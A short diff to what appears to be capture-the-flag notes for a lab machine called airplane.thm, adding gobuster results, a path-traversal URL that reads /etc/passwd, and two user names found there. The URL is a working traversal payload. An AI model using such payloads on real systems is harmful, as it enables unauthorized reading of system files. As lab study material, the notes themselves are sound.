@@ -37,7 +37,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 /airplane             (Status: 200) [Size: 655]
 
+## Found Path Traversal 
+http://airplane.thm:8000/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 
 
+carlos:x:1000: nothing
+hudson:x:1001: get some files from home folder
 
 </code>
